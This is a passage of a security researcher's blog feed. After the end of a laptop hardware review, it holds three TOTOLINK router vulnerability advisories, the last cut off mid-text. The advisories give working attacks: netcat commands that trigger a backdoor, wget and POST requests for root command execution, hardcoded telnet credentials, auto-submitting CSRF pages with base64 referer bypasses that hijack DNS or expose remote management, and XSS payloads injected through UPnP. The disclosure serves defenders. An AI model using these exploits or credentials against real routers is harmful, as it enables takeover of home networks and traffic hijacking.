00:14.0 USB controller: Intel Corporation Wildcat Point-LP USB xHCI Controller (rev 03)
00:16.0 Communication controller: Intel Corporation Wildcat Point-LP MEI Controller #1 (rev 03)
00:1b.0 Audio device: Intel Corporation Wildcat Point-LP High Definition Audio Controller (rev 03)
00:1c.0 PCI bridge: Intel Corporation Wildcat Point-LP PCI Express Root Port #1 (rev e3)
00:1d.0 USB controller: Intel Corporation Wildcat Point-LP USB EHCI Controller (rev 03)
00:1f.0 ISA bridge: Intel Corporation Wildcat Point-LP LPC Controller (rev 03)
00:1f.2 SATA controller: Intel Corporation Wildcat Point-LP SATA Controller [AHCI Mode] (rev 03)
00:1f.3 SMBus: Intel Corporation Wildcat Point-LP SMBus Controller (rev 03)
01:00.0 Network controller: Intel Corporation Wireless 7260 (rev bb)
</code></pre>
<h2>Misc:</h2>
<ul>
<li>Suspend-to-RAM works</li>
<li>Sound works</li>
</ul>
<h2>Untested:</h2>
<ul>
<li>bluetooth</li>
</ul>
<h1>Final Conclusion:</h1>
<p>Everything works. The laptop is very light and has great performances.
Note that this laptop can be ordered without Windows, and <a href="https://pierrekim.github.io/blog/2015-06-09-recovering-windows-on-a-windows-free-lg-laptop.html">Windows can be recovered in the "Windows-Free" SSD</a>.</p></content>
    </entry>
    
    <entry>
        <title>Backdoor and RCE found in 8 TOTOLINK router models</title>
        <link href="2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html"/>
        <content type="html"><h2>Product Description</h2>
<p>TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.</p>
<h2>Vulnerabilities Summary</h2>
<p>A backdoor is present in several TOTOLINK products.
This was confirmed by analyzing the latest firmwares and by testing the backdoor against live routers.</p>
<p>At least 8 TOTOLINK products are affected (firmwares come from totolink.net and from totolink.cn):</p>
<ul>
<li>A850R-V1 : until last firwmware TOTOLINK-A850R-V1.0.1-B20150707.1612.web</li>
<li>F1-V2 : until last firmware F1-V2.1.1-B20150708.1646.web</li>
<li>F2-V1 : until last firmware F2-V2.1.0-B20150320.1611.web</li>
<li>N150RT-V2 : until last firmware TOTOLINK-N150RT-V2.1.1-B20150708.1548.web</li>
<li>N151RT-V2 : until last firmware TOTOLINK-N151RT-V2.1.1-B20150708.1559.web</li>
<li>N300RH-V2 : until last firmware TOTOLINK-N300RH-V2.0.1-B20150708.1625.web</li>
<li>N300RH-V3 : until last firmware TOTOLINK-N300RH-V3.0.0-B20150331.0858.web</li>
<li>N300RT-V2 : until last firmware TOTOLINK-N300RT-V2.1.1-B20150708.1613.web</li>
</ul>
<p>By sending a crafted request to the WAN IP, an attacker will open the HTTP remote management interface on the Internet.
Then an attacker can use a Remote Code Execution in the HTTP remote management interface by using the hidden /boafrm/formSysCmd form, bypassing the authentication system.</p>
<p>We estimate there are =~ 50 000 routers affected by this backdoor.</p>
<h2>Details - backdoor</h2>
<p>The /etc/init.d/rcS script executes the /bin/skt binary when the router starts:</p>
<pre><code>cat etc/init.d/rcS
[...]
# start web server
boa
skt&amp;
</code></pre>
<p>skt is a small MIPS binary which is a client/server program. The arguments are:</p>
<pre><code>server: ./skt
client: ./skt host cmd
</code></pre>
<p>The binary can be used in x86_64 machines using QEMU: sudo chroot . ./qemu-mips-static ./bin/skt</p>
<p>Using skt without argument will launch a TCP daemon on port 5555 in every interface (including WAN), acting as an ECHO server.
Using skt with arguments will send a TCP packet containing the command to the specified IP on port 5555.</p>
<p>There are 2 main functions in <code>skt</code>:</p>
<ul>
<li>TcpClient is a simple TCP client.</li>
<li>TcpServer looks like an echo server.</li>
</ul>
<p><strong>TcpClient:</strong></p>
<p>It will send a TCP packet containing hel,xasf, oki,xasf or bye,xasf, depending the arguments used (1,2,3), to a remote IP on port 5555.</p>
<p><strong>TcpServer:</strong></p>
<p>TcpServer is an echo server listening on port 5555/tcp and  it compares strings provided by the user with hardcoded
strings ("hel,xasf", "oki,xasf").</p>
<p>The problem is in the sub_400B50 function:</p>
<p><img alt="" src="images/2015-totolink-0x02-backdoor-00.png" /></p>
<p><strong>Pseudo-code of sub_400B50:</strong></p>
<pre><code>int32_t sub_400B50(int32_t a1, char *str, int32_t a3, int32_t a4, int32_t a5) {
    if (strcmp(str, "hel,xasf") == 0) {
        system("iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT");
    } else {
        if (strcmp(str, "oki,xasf") == 0) {
            system("iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT");
        }
    }
    [...]
}
</code></pre>
<p>This function compares str, which is an user-given string, with 2 hardcoded strings to execute system().</p>
<p>The analysis of the binary running on the TOTOLINK devices shows the server mode responds to 3 commands by silently executing
system() in the background:</p>
<ul>
<li>
<p>By sending "hel,xasf" to the device, the device will execute:</p>
<p>iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT</p>
<p>This will open the HTTP remote management interface on port 80 in the eth1 interface which is the WAN interface by default.</p>
</li>
<li>
<p>By sending "oki,xasf" to the device, the device will execute:</p>
<p>iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT </p>
<p>This will close the HTTP remote management interface.</p>
</li>
<li>
<p>By sending "bye,xasf" (hardcoded string in the binary) to the device, the device will do nothing</p>
</li>
</ul>
<p>The iptables commands in the backdoor are hardcoded with "eth1".
Only devices using DHCP and static IP connections are affected because the WAN IP is attached on the eth1 device.</p>
<p>It does not affect devices using PPPoE connections, because the WAN IP is attached on the ppp device, as seen below:</p>
<pre><code>totolink# ifconfig
ppp0      Link encap:Point-to-Point Protocol  
          inet addr:X.X.X.X  P-t-P:X.X.X.X  Mask:255.255.255.255
          UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1438  Metric:1
          RX packets:17308398 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2605290 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:64 
          RX bytes:2803138455 (2.6 GiB)  TX bytes:277402492 (264.5 MiB)
</code></pre>
<p>An attacker can use these simple netcat commands to test the backdoor:</p>
<p>To open the HTTP remote management interface on the Internet:</p>
<pre><code>echo -ne "hel,xasf" | nc &lt;ip&gt; 5555
</code></pre>
<p>To close the HTTP remote management interface on the Internet:</p>
<pre><code>echo -ne "oki,xasf" | nc &lt;ip&gt; 5555
</code></pre>
<p>To detect a vulnerable router:</p>
<pre><code>echo -ne "GET / HTTP/1.1" | nc &lt;ip&gt; 5555

if you see "GET / HTTP/1.1" in the answer, you likely detected a vulnerable router.
</code></pre>
<p><strong>HTTP remote management interface open with the backdoor:</strong></p>
<p><img alt="" src="images/2015-totolink-0x02-backdoor-01.png" /></p>
<h2>Details - RCE in the management interface</h2>
<p>A hidden form in the latest firmware allows an attacker to execute commands as root by sending a HTTP request:</p>
<pre><code>POST /boafrm/formSysCmd HTTP/1.1

sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=
</code></pre>
<p>An attacker can use wget to execute commands in the remote device:</p>
<pre><code>wget --post-data='sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
</code></pre>
<p>For instance, sending this HTTP request to the management interface will reboot the device:</p>
<pre><code>POST /boafrm/formSysCmd HTTP/1.1

sysCmd=reboot&amp;apply=Apply&amp;msg=
</code></pre>
<p>This wget command will do the same job:</p>
<pre><code>wget --post-data='sysCmd=reboot&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
</code></pre>
<h2>Vendor Response</h2>
<p>TOTOLINK was not contacted in regard of this case.</p>
<h2>Report Timeline</h2>
<ul>
<li>Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.</li>
<li>Jun 26, 2015: working PoCs with RCE.</li>
<li>Jul 16, 2015: A public advisory is sent to security mailing lists.</li>
</ul>
<h2>Credit</h2>
<p>These vulnerabilities were found by Alexandre Torres and Pierre Kim (@PierreKimSec).</p>
<h2>References</h2>
<p>https://pierrekim.github.io/advisories/2015-totolink-0x02.txt</p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/</p>
<p>Complete advisory:</p>
<pre><code>-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

## Advisory Information

Title: Backdoor and RCE found in 8 TOTOLINK router models
Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x02.txt
Blog URL: https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html
Date published: 2015-07-16
Vendors contacted: None
Release mode: 0days, Released
CVE: no current CVE



## Product Description

TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.



## Vulnerabilities Summary

A backdoor is present in several TOTOLINK products.
This was confirmed by analyzing the latest firmwares and by testing the backdoor against live routers.

At least 8 TOTOLINK products are affected (firmwares come from totolink.net and from totolink.cn):

- A850R-V1 : until last firwmware TOTOLINK-A850R-V1.0.1-B20150707.1612.web
- F1-V2 : until last firmware F1-V2.1.1-B20150708.1646.web
- F2-V1 : until last firmware F2-V2.1.0-B20150320.1611.web
- N150RT-V2 : until last firmware TOTOLINK-N150RT-V2.1.1-B20150708.1548.web
- N151RT-V2 : until last firmware TOTOLINK-N151RT-V2.1.1-B20150708.1559.web
- N300RH-V2 : until last firmware TOTOLINK-N300RH-V2.0.1-B20150708.1625.web
- N300RH-V3 : until last firmware TOTOLINK-N300RH-V3.0.0-B20150331.0858.web
- N300RT-V2 : until last firmware TOTOLINK-N300RT-V2.1.1-B20150708.1613.web


By sending a crafted request to the WAN IP, an attacker will open the HTTP remote management interface on the Internet.
Then an attacker can use a Remote Code Execution in the HTTP remote management interface by using the hidden /boafrm/formSysCmd form, bypassing the authentication system.

We estimate there are =~ 50 000 routers affected by this backdoor.



## Details - backdoor

The init.d script executes the /bin/skt binary when the router starts:

cat etc/init.d/rcS
[...]
# start web server
boa
skt&amp;


skt is a small MIPS binary which is a client/server program. The arguments are:

server: ./skt
client: ./skt host cmd


The binary can be used in x86_64 machines using QEMU: sudo chroot . ./qemu-mips-static ./bin/skt

Using skt without argument will launch a TCP daemon on port 5555 in every interface (including WAN), acting as an ECHO server.
Using skt with arguments will send a TCP packet containing the command to the specified IP on port 5555.

The analysis of the binary running on the TOTOLINK devices (for more details, read
http://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html ) shows the server mode responds to 3 commands by silently executing
system() in the background:


o By sending "hel,xasf" to the device, the device will execute: iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT

This will open the HTTP remote management interface on port 80 in the eth1 interface which is the WAN interface by default.


o By sending "oki,xasf" to the device, the device will execute: iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT

This will close the HTTP remote management interface.


o By sending "bye,xasf" to the device, the device will do nothing


The iptables commands in the backdoor are hardcoded with "eth1".
Only devices using DHCP and static IP connections are affected because the WAN IP is attached on the eth1 device.

It does not affect devices using PPPoE connections, because the WAN IP is attached on the ppp device, as seen below:

totolink# ifconfig
ppp0      Link encap:Point-to-Point Protocol
inet addr:X.X.X.X  P-t-P:X.X.X.X  Mask:255.255.255.255
UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1438  Metric:1
RX packets:17308398 errors:0 dropped:0 overruns:0 frame:0
TX packets:2605290 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:64
RX bytes:2803138455 (2.6 GiB)  TX bytes:277402492 (264.5 MiB)



An attacker can use these simple netcat commands to test the backdoor:

To open the HTTP remote management interface on the Internet:

echo -ne "hel,xasf" | nc &lt;ip&gt; 5555

To close the HTTP remote management interface on the Internet:

echo -ne "oki,xasf" | nc &lt;ip&gt; 5555

To detect a vulnerable router:

echo -ne "GET / HTTP/1.1" | nc &lt;ip&gt; 5555

if you see "GET / HTTP/1.1" in the answer, you likely detected a vulnerable router.


## Details - RCE in the management interface

A hidden form in the latest firmware allows an attacker to execute commands as root by sending a HTTP request:


POST /boafrm/formSysCmd HTTP/1.1

sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=


An attacker can use wget to execute commands in the remote device:

wget --post-data='sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd


For instance, sending this HTTP request to the management interface will reboot the device:


POST /boafrm/formSysCmd HTTP/1.1

sysCmd=reboot&amp;apply=Apply&amp;msg=

This wget command will do the same job:

wget --post-data='sysCmd=reboot&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd



## Vendor Response

TOTOLINK was not contacted in regard of this case.



## Report Timeline

* Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.
* Jun 26, 2015: Working PoCs with RCE.
* Jul 13, 2015: Updated firmwares confirmed vulnerable.
* Jul 16, 2015: A public advisory is sent to security mailing lists.



## Credit

These vulnerabilities were found by Alexandre Torres and Pierre Kim (@PierreKimSec).



## References

https://pierrekim.github.io/advisories/2015-totolink-0x02.txt
https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html



## Disclaimer

This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/


-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCgAGBQJVq/MLAAoJEMQ+Dtp9ky28bGEQAKcXghQtecYt4bSd+isQ7zh8
8z6Q05F5fiReKaXSR2dFlBhulsq6o5TjIQsGB2mG/2GOthqn7KHNYwVMSGrdYNd6
lmOD3yPnGl3c2SyuiabUEYk7FvoyZ2g71mxxyie4/dV7I3jir2DGToInjEp0IXgU
hM6CeTFoTO5y9Z6VYHaaxI2POgqD9OojmL+1oE7h3bMiMoOftXeDh1IUSLpQddHa
wBDHWhLXXJYNxv2vWubJaefv6gRomeaapLjODCMiMJX0Br4EZ9gzpzonOEGG+I8z
gRwl+JO0CrxDhysiyMayU5uPsifomcWVXaEEZRdTMWDfWH0qB/f0/2zbFVMVzCVk
17AedQyoPXWELhS7i9afZ2JCylcEHLgMhQeDQG48lQf4SCFxCyKD09pVnG13lsUC
Ee2EQB5A7FkqcwAbq7xRnZuMd/Lpl/RuSKIby7VbqfcI1MDnKoKt9XQ9lLIulQvk
WRnMgUxoyQ8fFzFn265qvb3a3RSWc+Yl8xRUky4IZ3jd+nbEqHdPWCKSG4D2C45J
NHpyeY+aZ2p/hxCfJckJtzYdcZGXSVfO2FU0rr94K9XAeWXj3+RP3DOKGoTRLZCT
7OxaHVHiB7aLXS2qta4EBYyjFVHJZOmlcyjYcKY/RhMGomWvoUegG3z7eAbjaoj0
k2ILiaGzfv4z+aJ/iI05
=z70S
-----END PGP SIGNATURE-----
</code></pre></content>
    </entry>
    
    <entry>
        <title>Backdoor credentials found in 4 TOTOLINK router models</title>
        <link href="2015-07-16-backdoor-credentials-found-in-4-TOTOLINK-products.html"/>
        <content type="html"><pre><code>-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

## Advisory Information

Title: Backdoor credentials found in 4 TOTOLINK router models
Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x03.txt
Blog URL: https://pierrekim.github.io/blog/2015-07-16-backdoor-credentials-found-in-4-TOTOLINK-products.html
Date published: 2015-07-16
Vendors contacted: None
Release mode: 0days, Released
CVE: no current CVE



## Product Description

TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.



## Vulnerabilities Summary

Backdoor credentials are present in several TOTOLINK products.

It affects 4 TOTOLINK products (firmwares come from totolink.net and from totolink.cn):

- G150R-V1 : last firmware 1.0.0-B20150330 (TOTOLINK-G150R-V1.0.0-B20150330.1734.web)
- G300R-V1 : last firmware 1.0.0-B20150330 (TOTOLINK-G300R-V1.0.0-B20150330.1816.web)
- N150RH-V1 : last firmware 1.0.0-B20131219 (TOTOLINK-N150RH-V1.0.0-B20131219.1014.web)
- N301RT-V1 : last firmware 1.0.0 (TOTOLINK N301RT_V1.0.0.web)

It allows an attacker in the LAN to connect to the device using telnet with 2 different accounts: root and 'onlime_r' which gives with root privileges.



## Details - G150R-V1 and G300R-V1

The init.d script executes these commands when the router starts:

[...]
cp /etc/passwd_orig /var/passwd
cp /etc/group_orig /var/group
telnetd&amp;
[...]


The /etc/passwd_orig contains backdoor credentials:

root:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
onlime_r:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
nobody:x:0:0:nobody:/:/dev/null

The corresponding passwords are:

root:12345
onlime_r:12345


## Details - N150RH-V1 and N301RT

The init.d script executes these commands when the router starts:

[...]
#start telnetd
telnetd&amp;
[...]

The binary /bin/sysconf executes these commands when the router starts:

system("cp /etc/passwd.org /var/passwd 2&gt; /dev/null")


The /etc/passwd.org contains backdoor credentials:

root:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
onlime_r:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
nobody:x:0:0:nobody:/:/dev/null

The corresponding passwords are:

root:12345
onlime_r:12345



## Vendor Response

TOTOLINK was not contacted in regard of this case.



## Report Timeline

* Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.
* Jun 26, 2015: working PoCs.
* Jul 16, 2015: A public advisory is sent to security mailing lists.



## Credit

These backdoor credentials were found Pierre Kim (@PierreKimSec).



## References

https://pierrekim.github.io/advisories/2015-totolink-0x03.txt



## Disclaimer

This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/


-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCgAGBQJVq/MNAAoJEMQ+Dtp9ky28FroP/jM/FCTlC93R5bdmPzn7l0kR
247lhuqqMO689jGkz3kiTqUIEidKoAluH6xqs2xhqVMYie9CfrWsRwrbuF+5RSkZ
jmzvGVH2teGBuJ70+hVY81FvEsleG5eCdz4nZXKPcyLMfSw0HxxBp4ooCDQsSj2f
WAgKfQmKY123TLAwE+R51z2ZXPlxMIyRyjy33utQk5wtDCK0gqOtsFqA7CLtJgth
EBi2YjrxNDM8FYJx4f7A8RBAOp34rHQx/xn2yvylwUkwZ8P0LcC9EmMPZUo0q3xu
dIfPV1HJWlYyPVxqXg9ATWvODBbAyOWpf0/CwBsRmZVRbJL7/9tCzDYRwrm9PFgJ
Od47n+82UfvD1aiAQxdm983Rf5i2t2ssW/e2fr9jOiWqIQChc/eRmUpso8Okluzo
ZUVxhJGBigAsd+Z0FRCeBUki8LUKCAtbfe7Vkn/v5AlOamyc/VNOQNZpbbqa1SUv
64DaPOhzXQ6WBGkzwxWOHy+qfQT+7/dfGZ7i6n7TwV4tIJm6yLioPBp7F1WceWh6
KySutfVi0wpIf8mcbigsdaHmPqGSNxKnbitr8GETdV+WME5REvn9d8DhSJ7Cy+Eh
PNPDAdSZES8WPl0f5QCNgNUxrCsFM7DLW6P15HFI/NqFzLAdifqT6IKeQtXTdYwH
g9PPILKUXFZssc0SceTB
=pLPu
-----END PGP SIGNATURE-----
</code></pre></content>
    </entry>
    
    <entry>
        <title>4 TOTOLINK router models vulnerable to CSRF and XSS attacks</title>
        <link href="2015-07-16-4-TOTOLINK-products-vulnerable-to-CSRF-and-XSS-attacks.html"/>
        <content type="html"><pre><code>-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

## Advisory Information

Title: 4 TOTOLINK router models vulnerable to CSRF and XSS attacks
Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x01.txt
Blog URL: http://pierrekim.github.io/blog/2015-07-16-4-TOTOLINK-products-vulnerable-to-CSRF-and-XSS-attacks.html
Date published: 2015-07-16
Vendors contacted: None
Release mode: Released, 0day
CVE: no current CVE



## Product Description

TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.



## Vulnerability Summary

TOTOLINK iPuppy, iPuppy3, N100RE and N200RE are wireless LAN routers. Their current firmwares with default configuration are
vulnerable to CSRF-attacks and XSS attacks.
Since, the anti-CSRF protection is based on a static HTTP referrer (RFC 1945), an attacker can take over
most of the configuration and settings using anyone inside the LAN of the router. Owners are urged to
contact TOTOLINK, and activate authentication on this product (disabled by default).

It affects (firmwares come from totolink.net and from totolink.cn):

- TOTOLINK iPuppy : firmware 1.2.1 (TOTOLINK iPuppy__V1.2.1.update)
- TOTOLINK iPuppy3 : firmware 1.0.2 (TOTOLINK iPuppy3_V1.0.2.update)
- TOTOLINK N100RE-V1 : firmware V1.1-B20140723-2-432-EN (TOTOLINK-N100RE-IP04216-RT5350-SPI-1M8M-V1.1-B20140723-2-432-EN.update)
- TOTOLINK N200RE : firmware V1.4-B20140724-2-457-EN (TOTOLINK-N200RE-IP04220-MT7620-SPI-1M8M-V1.4-B20140724-2-457-EN.update)



## Details - CSRF

The HTTP interface allows to edit the configuration. This interface is vulnerable to CSRF.

Configuration and settings can be modified with CSRF attacks:
- Activate the remote control management
- Change the DNS configuration
- Update the firmware
- Change the Wifi Configuration
- Create TCP redirections to the LAN
- and more...


Example of forms exploiting the CSRF:


o Activating the remote control management on port 31337/tcp listening on the WAN interface.

&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
function s() {
document.f.submit();
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body onload="s()"&gt;
&lt;form id="f" name="f" method="POST" action="http://192.168.1.1/do_cmd.htm"&gt;
&lt;input type="hidden" name="CMD" value="SYS"&gt;
&lt;input type="hidden" name="GO" value="firewallconf_accesslist.html"&gt;
&lt;input type="hidden" name="nowait" value="1"&gt;
&lt;input type="hidden" name="SET0" value="17367296=31337"&gt;
&lt;input type="hidden" name="SET1" value="17236224=1"&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;


o Changing the DNS configuration to 0.2.0.7 and 1.2.0.1:

&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
function s() {
document.f.submit();
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body onload="s()"&gt;
&lt;form id="f" name="f" method="POST" action="http://192.168.1.1/do_cmd.htm"&gt;
&lt;input type="hidden" name="CMD" value="WAN"&gt;
&lt;input type="hidden" name="GO" value="netconf_wansetup.html"&gt;
&lt;input type="hidden" name="SET0" value="50397440=2"&gt;
&lt;input type="hidden" name="SET1" value="50856960=64-E5-99-AA-AA-AA"&gt;
&lt;input type="hidden" name="SET2" value="235077888=1"&gt;
&lt;input type="hidden" name="SET3" value="235012865=0.2.0.7"&gt;
&lt;input type="hidden" name="SET4" value="235012866=1.2.0.1"&gt;
&lt;input type="hidden" name="SET5" value="51118336=0"&gt;
&lt;input type="hidden" name="SET6" value="51839232=1"&gt;
&lt;input type="hidden" name="SET7" value="51511552=1500"&gt;
&lt;input type="hidden" name="SET8" value="117834240="&gt;
&lt;input type="hidden" name="SET9" value="117703168="&gt;
&lt;input type="hidden" name="SET10" value="117637376=1492"&gt;
&lt;input type="hidden" name="SET11" value="51446016=1500"&gt;
&lt;input type="hidden" name="SET12" value="50463488=192.168.1.1"&gt;
&lt;input type="hidden" name="SET13" value="50529024=255.255.255.0"&gt;
&lt;input type="hidden" name="SET14" value="50594560=192.168.1.254"&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;


The variable GO is an open redirect. Any URL like http://www.google.com/ for instance can be used.
The variable GO is also vulnerable to XSS. It's out of scope in this advisory.


To bypass the protection (which checks the refer), you can, for example, base64 the form and include
it in the webpage.
The refer will be empty and the CSRF will be accepted by the device:



o activate_admin_wan_csrf_bypass.html:

&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Refresh" content="1;url=data:text/html;charset=utf8;base64,PGh0bWw+CjxoZWFkPgo8c2NyaXB0PgpmdW5jdGlvbiBzKCkgewogIGRvY3VtZW50LmYuc3VibWl0KCk7Cn0KPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHkgb25sb2FkPSJzKCkiPgo8Zm9ybSBpZD0iZiIgbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249Imh0dHA6Ly8xOTIuMTY4LjEuMS9kb19jbWQuaHRtIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iQ01EIiB2YWx1ZT0iU1lTIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iR08iIHZhbHVlPSJmaXJld2FsbGNvbmZfYWNjZXNzbGlzdC5odG1sIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ibm93YWl0IiB2YWx1ZT0iMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDAiIHZhbHVlPSIxNzM2NzI5Nj0zMTMzNyI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEiIHZhbHVlPSIxNzIzNjIyND0xIj4KPC9mb3JtPgo8L2JvZHk+CjwvaHRtbD4K"&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;


Visiting activate_admin_wan_csrf_bypass.html in a remote location will activate
the remote management interface on port 31337/TCP.

You can test it through http://pierrekim.github.io/advisories/2015-totolink-0x01-PoC-change_dns_csrf_bypass.html



o change_dns_csrf_bypass.html:

&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Refresh" content="1;url=data:text/html;charset=utf8;base64,PGh0bWw+CjxoZWFkPgo8c2NyaXB0PgpmdW5jdGlvbiBzKCkgewogIGRvY3VtZW50LmYuc3VibWl0KCk7Cn0KPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHkgb25sb2FkPSJzKCkiPgo8Zm9ybSBpZD0iZiIgbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249Imh0dHA6Ly8xOTIuMTY4LjEuMS9kb19jbWQuaHRtIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iQ01EIiB2YWx1ZT0iV0FOIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iR08iIHZhbHVlPSJuZXRjb25mX3dhbnNldHVwLmh0bWwiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJTRVQwIiB2YWx1ZT0iNTAzOTc0NDA9MiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEiIHZhbHVlPSI1MDg1Njk2MD02NC1FNS05OS1BQS1BQS1BQSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDIiIHZhbHVlPSIyMzUwNzc4ODg9MSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDMiIHZhbHVlPSIyMzUwMTI4NjU9MC4yLjAuNyI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDQiIHZhbHVlPSIyMzUwMTI4NjY9MS4yLjAuMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDUiIHZhbHVlPSI1MTExODMzNj0wIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUNiIgdmFsdWU9IjUxODM5MjMyPTEiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJTRVQ3IiB2YWx1ZT0iNTE1MTE1NTI9MTUwMCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDgiIHZhbHVlPSIxMTc4MzQyNDA9Ij4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUOSIgdmFsdWU9IjExNzcwMzE2OD0iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJTRVQxMCIgdmFsdWU9IjExNzYzNzM3Nj0xNDkyIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUMTEiIHZhbHVlPSI1MTQ0NjAxNj0xNTAwIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUMTIiIHZhbHVlPSI1MDQ2MzQ4OD0xOTIuMTY4LjEuMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEzIiB2YWx1ZT0iNTA1MjkwMjQ9MjU1LjI1NS4yNTUuMCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDE0IiB2YWx1ZT0iNTA1OTQ1NjA9MTkyLjE2OC4xLjI1NCI+CjwvZm9ybT4KPC9ib2R5Pgo8L2h0bWw+Cg=="&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;


Visiting activate_admin_wan_csrf_bypass.html in a remote location will change the DNS servers
provided by the TOTOLINK device in the LAN.

You can test it through http://pierrekim.github.io/advisories/2015-totolink-0x01-PoC-activate_admin_wan_csrf_bypass.html



## Details - stored XSS and fun

There is a stored XSS, which can be injected using UPNP from the LAN, without authentication:

upnp&gt; host send 0 WANConnectionDevice WANIPConnection AddPortMapping

Required argument:
Argument Name:  NewPortMappingDescription
Data Type:      string
Allowed Values: []
Set NewPortMappingDescription value to: &lt;script&gt;alert("XSS");&lt;/script&gt;

Required argument:
Argument Name:  NewLeaseDuration
Data Type:      ui4
Allowed Values: []
Set NewLeaseDuration value to: 0

Required argument:
Argument Name:  NewInternalClient
Data Type:      string
Allowed Values: []
Set NewInternalClient value to: &lt;script&gt;alert("XSS");&lt;/script&gt;

Required argument:
